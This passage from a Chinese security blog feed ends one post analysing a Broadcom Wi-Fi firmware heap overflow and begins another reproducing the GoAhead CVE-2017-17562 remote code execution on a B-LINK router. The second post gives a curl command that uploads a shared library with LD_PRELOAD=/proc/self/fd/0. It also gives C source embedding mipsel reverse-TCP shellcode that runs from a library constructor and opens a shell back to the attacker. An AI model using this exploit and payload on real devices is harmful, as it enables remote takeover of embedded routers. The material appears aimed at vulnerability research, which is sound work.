class="keyword">offset</span>, (u16_t)(p2|<span class="number">0xc000</span>));</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    ...</div><div class="line"><span class="comment">/* WME Parameters */</span></div><div class="line">    <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">/* TODO : if WME STA then send WME parameter element */</span></div><div class="line">        <span class="keyword">if</span> (wd-&gt;ap.qosMode == <span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">offset</span> = zfApAddIeWmePara(dev, buf, <span class="keyword">offset</span>, vap);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// jhlee HT 0</span></div><div class="line">    <span class="comment">//CWYang(+)</span></div><div class="line">    <span class="comment">/* HT Capabilities Info */</span></div><div class="line">    <span class="keyword">offset</span> = zfMmAddHTCapability(dev, buf, <span class="keyword">offset</span>);</div><div class="line">    <span class="comment">//CWYang(+)</span></div><div class="line">    <span class="comment">/* Extended HT Capabilities Info */</span></div><div class="line">    <span class="keyword">offset</span> = zfMmAddExtendedHTCapability(dev, buf, <span class="keyword">offset</span>);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>6）通知传输指示信息<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ATIM :<span class="comment">//通知传输指示消息</span></div><div class="line">            <span class="comment">/* NULL frame */</span></div><div class="line">            <span class="comment">/* TODO : add two dumb bytes temporarily */</span></div><div class="line">            <span class="keyword">offset</span> += <span class="number">2</span>;</div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>7）QoS帧/数据帧</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_QOS_NULL :</div><div class="line">            zmw_buf_writeh(dev, buf, <span class="keyword">offset</span>, <span class="number">0x0010</span>);</div><div class="line">            <span class="keyword">offset</span> += <span class="number">2</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> ZM_WLAN_DATA_FRAME :</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>8）解除关联/解除认证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_DISASOC :<span class="comment">//解除关联</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_DEAUTH :<span class="comment">//解除认证</span></div><div class="line">    <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">    &#123;</div><div class="line">      vap = (u16_t) p3;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> ((aid = zfApFindSta(dev, dst)) != <span class="number">0xffff</span>)</div><div class="line">      &#123;</div><div class="line">          zmw_enter_critical_section(dev);</div><div class="line">          <span class="comment">/* Clear STA table */</span></div><div class="line">          wd-&gt;ap.staTable[aid].valid = <span class="number">0</span>;</div><div class="line"></div><div class="line">          zmw_leave_critical_section(dev);</div><div class="line"></div><div class="line">          <span class="keyword">if</span> (wd-&gt;zfcbDisAsocNotify != <span class="keyword">NULL</span>)</div><div class="line">          &#123;</div><div class="line">              wd-&gt;zfcbDisAsocNotify(dev, (u8_t*)dst, vap);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* Reason Code */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, offset, (u16_t)p1);</div><div class="line">    offset+=<span class="number">2</span>;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>在wifi连接过程中主要有这些数据包种类</p>
<p>9）发送数据包<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">zfwBufSetSize</span>(dev, buf, offset);<span class="comment">//拷贝构造好的数据包到dev</span></div><div class="line"></div><div class="line"><span class="selector-tag">zm_msg2_mm</span>(ZM_LV_2, <span class="string">"management frame body size="</span>, offset-hlen);</div><div class="line"></div><div class="line"><span class="comment">//Copy wlan header</span></div><div class="line"><span class="selector-tag">zfTxGenMmHeader</span>(dev, frameType, dst, header, offset-hlen, buf, vap, encrypt);<span class="comment">//发送数据包过程</span></div></pre></td></tr></table></figure></p>
<h2 id="Wifi固件接收到管理帧的处理过程"><a href="#Wifi固件接收到管理帧的处理过程" class="headerlink" title="Wifi固件接收到管理帧的处理过程"></a>Wifi固件接收到管理帧的处理过程</h2><p>我们关注的还是漏洞触发位置的重新关联响应帧</p>
<p>1）解析重新关联响应帧时造成溢出的过程</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">void wlc_bss_parse_wme_ie(wlc_info *wlc, ie_parser_arg *arg) &#123;</div><div class="line">  unsigned int frame_type;  </div><div class="line">  wlc_bsscfg *cfg;  </div><div class="line">  bcm_tlv *ie;  </div><div class="line">  unsigned char *current_wmm_ie;  </div><div class="line">  int flags;</div><div class="line">  <span class="function"><span class="title">frame_type</span> = arg-&gt;</span>frame_type;  </div><div class="line">  <span class="function"><span class="title">cfg</span> = arg-&gt;</span>bsscfg;  </div><div class="line">  <span class="function"><span class="title">ie</span> = arg-&gt;</span>ie;  </div><div class="line">  <span class="function"><span class="title">current_wmm_ie</span> = cfg-&gt;</span>current_wmm_ie;  </div><div class="line">  <span class="keyword">if</span> ( frame_type == FC_REASSOC_REQ ) &#123;    </div><div class="line">    ...    </div><div class="line">    &lt;handle reassociation requests&gt;    </div><div class="line">    ...  &#125;  </div><div class="line">  <span class="keyword">if</span> ( frame_type == FC_ASSOC_RESP ) &#123;    </div><div class="line">    ...    </div><div class="line">    <span class="function"><span class="title">if</span> ( wlc-&gt;</span><span class="function"><span class="title">pub</span>-&gt;</span>_wme ) &#123;      </div><div class="line">      <span class="keyword">if</span> ( !(flags &amp; <span class="number">2</span>) ) &#123;        </div><div class="line">        ...        </div><div class="line">        <span class="keyword">if</span> ( ie ) &#123;          </div><div class="line">          ...          </div><div class="line">          <span class="function"><span class="title">cfg</span>-&gt;</span>flags |= <span class="number">0</span>x100u;          </div><div class="line">          <span class="function"><span class="title">memcpy</span>(current_wmm_ie, ie-&gt;</span><span class="function"><span class="title">data</span>, ie-&gt;</span>len);</div></pre></td></tr></table></figure>
<p>2)溢出的位置确定</p>
<p>溢出的位置是current_wmm_ie的下一个结构体wlc-&gt;pm</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">wlc_bsscfg *wlc_bsscfg_malloc(wlc_info *wlc) &#123;  </div><div class="line">  wlc_info *wlc<span class="comment">;  </span></div><div class="line">  wlc_bss_info *current_bss<span class="comment">;  </span></div><div class="line">  wlc_bss_info *target_bss<span class="comment">;  </span></div><div class="line">  wlc_pm_st *pm<span class="comment">;  </span></div><div class="line">  wmm_ie *current_wmm_ie<span class="comment">;</span></div><div class="line">  ...  </div><div class="line">  current_bss = wlc_calloc(<span class="number">0x124</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;current_bss = current_bss<span class="comment">;  </span></div><div class="line">  if ( !current_bss ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  target_bss = wlc_calloc(<span class="number">0x124</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;target_bss = target_bss<span class="comment">;  </span></div><div class="line">  if ( !target_bss ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  pm = wlc_calloc(<span class="number">0x78</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;pm = pm<span class="comment">;  </span></div><div class="line">  if ( !pm ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  current_wmm_ie = wlc_calloc(<span class="number">0x2C</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;current_wmm_ie = current_wmm_ie<span class="comment">;  </span></div><div class="line">  if ( !current_wmm_ie ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;</span></div></pre></td></tr></table></figure>
<p>3）溢出结构体类型</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct wlc_pm_st &#123; </div><div class="line">  uint8 PM<span class="comment">; bool PM_override; </span></div><div class="line">  mbool PMenabledModuleId<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMenabled<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMawakebcn<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMpending<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>priorPMstate<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PSpoll<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>check_for_unaligned_tbtt<span class="comment">; </span></div><div class="line">  uint16 pspoll_prd<span class="comment">; </span></div><div class="line">  struct wl_timer *pspoll_timer<span class="comment">; </span></div><div class="line">  uint16 apsd_trigger_timeout<span class="comment">; </span></div><div class="line">  struct wl_timer *apsd_trigger_timer<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>apsd_sta_usp<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>WME_PM_blocked<span class="comment">; </span></div><div class="line">  uint16 pm2_rcv_percent<span class="comment">; </span></div><div class="line">  pm2rd_state_t pm2_rcv_state<span class="comment">; </span></div><div class="line">  uint16 pm2_rcv_time<span class="comment">; </span></div><div class="line">  uint pm2_sleep_ret_time<span class="comment">; </span></div><div class="line">  uint pm2_sleep_ret_time_left<span class="comment">;  </span></div><div class="line">  uint pm2_last_wake_time<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>pm2_refresh_badiv<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>adv_ps_poll<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>send_pspoll_after_tx<span class="comment">;    </span></div><div class="line">  wlc_hwtimer_to_t *pm2_rcv_timer<span class="comment">;  </span></div><div class="line">  wlc_hwtimer_to_t *pm2_ret_timer<span class="comment">; </span></div><div class="line">&#125; wlc_pm_st_t<span class="comment">;</span></div></pre></td></tr></table></figure>
<p>4）漏洞利用方式</p>
<p>struct wlc_pm_st结构体中 wl_timer 类型的pspoll_timer、  apsd_trigger_timer，和wlc_hwtimer_to_t 类型的pm2_rcv_timer、  pm2_ret_timer。<br>wl_timer的 pspoll_timer 成员。这个结构体能在相关过程中定期触发的回调函数进行处理：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int timer_func(struct wl_timer *t) &#123;  </div><div class="line">  prev_cpsr = j_disable_irqs();  </div><div class="line">  <span class="function"><span class="title">v3</span> = t-&gt;</span>field_20;    </div><div class="line">  ...</div><div class="line">  <span class="keyword">if</span> ( v3 ) &#123;    </div><div class="line">    <span class="function"><span class="title">v7</span> = t-&gt;</span>field_18;    </div><div class="line">    <span class="function"><span class="title">v8</span> = &amp;t-&gt;</span>field_8;    </div><div class="line">    <span class="function"><span class="title">if</span> ( &amp;t-&gt;</span>field_8 == v7 ) &#123;</div><div class="line">      ... </div><div class="line">    &#125; <span class="keyword">else</span> &#123;      </div><div class="line">      <span class="function"><span class="title">v9</span> = t-&gt;</span>field_1c;      </div><div class="line">      <span class="function"><span class="title">v7</span>-&gt;</span>field_14 = v9;      </div><div class="line">      *(v9 + <span class="number">16</span>) = v7;      </div><div class="line">      <span class="keyword">if</span> ( *v3 == v8 ) &#123;        </div><div class="line">        <span class="function"><span class="title">v7</span>-&gt;</span>field_18 = v3; </div><div class="line">      &#125;    </div><div class="line">    &#125;    </div><div class="line">    <span class="function"><span class="title">t</span>-&gt;</span>field_20 = <span class="number">0</span>;  </div><div class="line">  &#125;  </div><div class="line">  j_restore_cpsr(prev_cpsr);  </div><div class="line">  return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这部分代码是在linux内核里，初步分析是wifi驱动管理帧数据包发送过程，结合研究固件的源码中解析数据包的过程一起看，差不多整个wifi连接过程数据包的处理流程就出来了。接下来的工作，一个是固件地址爆破，还有一个是写exp利用漏洞。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> 802.11协议帧格式 ：<a href="http://blog.csdn.net/u012570105/article/details/51785452" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/u012570105/article/details/51785452</a></p>
<p> <a href="http://note.youdao.com/noteshare?id=1966431935077db30135e04ba4bb80a6&amp;sub=C682C939E8AD4869B8C877E0CA546A24" rel="external nofollow noopener noreferrer" target="_blank">相关代码参考</a> ：</p>
<blockquote>
<p>cmm.c :主要是wifi驱动发送管理帧数据包流程</p>
<p>wl_linux.h : wl_timer结构体参考</p>
<p>wlan.h:</p>
</blockquote>
<pre><code>/* Frame Subtype */
#define ZM_WLAN_FRAME_TYPE_ASOCREQ          0x00
#define ZM_WLAN_FRAME_TYPE_ASOCRSP          0x10
#define ZM_WLAN_FRAME_TYPE_REASOCREQ        0x20
#define ZM_WLAN_FRAME_TYPE_REASOCRSP        0x30
#define ZM_WLAN_FRAME_TYPE_PROBEREQ         0x40
#define ZM_WLAN_FRAME_TYPE_PROBERSP         0x50
</code></pre><blockquote>
<p>wlc_alloc.c :wlc_bsscfg_malloc结构体</p>
<p>wlc_bsscfg.h : wlc_pm_st 结构体参考</p>
<p>wlc.c:部分解析管理帧可以根据关键字FC_ASSOC_RESP来定位看</p>
</blockquote>
<p>​        </p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;切入点&quot;&gt;&lt;a href=&quot;#切入点&quot; class=&quot;headerlink&quot; title=&quot;切入点&quot;&gt;&lt;/a&gt;切入点&lt;/h2&gt;&lt;p&gt;从解析wme信标帧开始&lt;br&gt;参考：&lt;a href=&quot;http://www.freebuf.com/vuls/142099.html
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
    
      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
    
  </entry>
  
  <entry>
    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
    <link href="http://www.future-sec.com/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
    <id>http://www.future-sec.com/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
    <published>2017-12-25T16:00:00.000Z</published>
    <updated>2017-12-26T03:03:58.834Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/15137816099569.jpg" alt=""></p>
<p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="http://p1aqjecep.bkt.clouddn.com/15137816744632.jpg" alt=""></p>
<p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="http://p1aqjecep.bkt.clouddn.com/15137935699186.jpg" alt=""></p>
<p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="http://p1aqjecep.bkt.clouddn.com/IMG_2461.jpg" alt="IMG_2461"></p>
<p>查看web server 是否 goahead 并且有cgi程序。</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/debug.jpg" alt="debug"></p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p>
<p><img src="http://p1aqjecep.bkt.clouddn.com/15137864957443.jpg" alt=""></p>
<p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>cat   mipsel-hw.c</div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"></div><div class="line">static void before_main(void) __attribute_<span class="number">_</span>((constructor));</div><div class="line"></div><div class="line">static void before_main(void)</div><div class="line">&#123;</div><div class="line">    write(<span class="number">1</span>, <span class="string">"Hello: World!\n"</span>, <span class="number">14</span>);</div><div class="line">&#125;</div><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</div><div class="line">pentest<span class="variable">@ubuntu</span><span class="symbol">:~/buildroot</span><span class="variable">$ </span>file mipsel-hw.so</div><div class="line">mipsel-hw.<span class="symbol">so:</span> ELF <span class="number">32</span>-bit LSB shared object, MIPS, MIPS32 version <span class="number">1</span> (SYSV), dynamically linked, <span class="keyword">not</span> stripped</div></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary <span class="meta">@payloads</span><span class="regexp">/mipsel-hw.so   http:/</span><span class="regexp">/192.168.16.1/</span>cgi-bin<span class="regexp">/upload_settings.cgi?LD_PRELOAD=/</span>proc<span class="regexp">/self/</span>fd/<span class="number">0</span> -i</div></pre></td></tr></table></figure>
<p><img src="http://p1aqjecep.bkt.clouddn.com/15137866081821.jpg" alt=""></p>
<p>回显成功，说明漏洞存在。</p>
<h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="http://p1aqjecep.bkt.clouddn.com/15137880896364.jpg" alt=""></p>
<p>写入动态链接库中</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">unsigned char sc[] = &#123;</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>04<span class="symbol">\x</span>28<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>11<span class="symbol">\x</span>11<span class="symbol">\x</span>04"</div><div class="line">    "<span class="symbol">\x</span>28<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>fd<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27<span class="symbol">\x</span>20"</div><div class="line">    "<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>a6<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>fd<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27"</div><div class="line">    "<span class="symbol">\x</span>20<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>27<span class="symbol">\x</span>28<span class="symbol">\x</span>80<span class="symbol">\x</span>01<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>06<span class="symbol">\x</span>28<span class="symbol">\x</span>57<span class="symbol">\x</span>10<span class="symbol">\x</span>02<span class="symbol">\x</span>24"</div><div class="line">    "<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>44<span class="symbol">\x</span>30<span class="symbol">\x</span>c9<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09"</div><div class="line">    "<span class="symbol">\x</span>01<span class="symbol">\x</span>c9<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>15<span class="symbol">\x</span>b3<span class="symbol">\x</span>05<span class="symbol">\x</span>3c<span class="symbol">\x</span>02<span class="symbol">\x</span>00"</div><div class="line">    "<span class="symbol">\x</span>a5<span class="symbol">\x</span>34<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>af<span class="symbol">\x</span>10<span class="symbol">\x</span>67<span class="symbol">\x</span>05<span class="symbol">\x</span>3c<span class="symbol">\x</span>c0<span class="symbol">\x</span>a8<span class="symbol">\x</span>a5<span class="symbol">\x</span>34<span class="symbol">\x</span>fc"</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>af<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>23<span class="symbol">\x</span>ef<span class="symbol">\x</span>ff<span class="symbol">\x</span>0c<span class="symbol">\x</span>24<span class="symbol">\x</span>27<span class="symbol">\x</span>30<span class="symbol">\x</span>80<span class="symbol">\x</span>01"</div><div class="line">    "<span class="symbol">\x</span>4a<span class="symbol">\x</span>10<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09<span class="symbol">\x</span>01<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>08<span class="symbol">\x</span>3c<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>08"</div><div class="line">    "<span class="symbol">\x</span>35<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>08<span class="symbol">\x</span>3c<span class="symbol">\x</span>6e<span class="symbol">\x</span>2f<span class="symbol">\x</span>08<span class="symbol">\x</span>35<span class="symbol">\x</span>f0<span class="symbol">\x</span>ff"</div><div class="line">    "<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>07<span class="symbol">\x</span>28<span class="symbol">\x</span>f4<span class="symbol">\x</span>ff<span class="symbol">\x</span>a7<span class="symbol">\x</span>af<span class="symbol">\x</span>fc<span class="symbol">\x</span>ff<span class="symbol">\x</span>a7<span class="symbol">\x</span>af<span class="symbol">\x</span>ec"</div><div class="line">    "<span class="symbol">\x</span>ff<span class="symbol">\x</span>a4<span class="symbol">\x</span>23<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>23<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a8<span class="symbol">\x</span>af<span class="symbol">\x</span>f8<span class="symbol">\x</span>ff<span class="symbol">\x</span>a5<span class="symbol">\x</span>23"</div><div class="line">    "<span class="symbol">\x</span>ec<span class="symbol">\x</span>ff<span class="symbol">\x</span>bd<span class="symbol">\x</span>27<span class="symbol">\x</span>ff<span class="symbol">\x</span>ff<span class="symbol">\x</span>06<span class="symbol">\x</span>28<span class="symbol">\x</span>ab<span class="symbol">\x</span>0f<span class="symbol">\x</span>02<span class="symbol">\x</span>24<span class="symbol">\x</span>0c<span class="symbol">\x</span>09<span class="symbol">\x</span>09"</div><div class="line">    "<span class="symbol">\x</span>01"</div><div class="line">&#125;;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">static void before_main(void) __attribute__((constructor));</div><div class="line"></div><div class="line">static void before_main(void)</div><div class="line">&#123;</div><div class="line">    void(*s)(void);</div><div class="line">    s = sc;</div><div class="line">    s();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Buildroot编译</p>
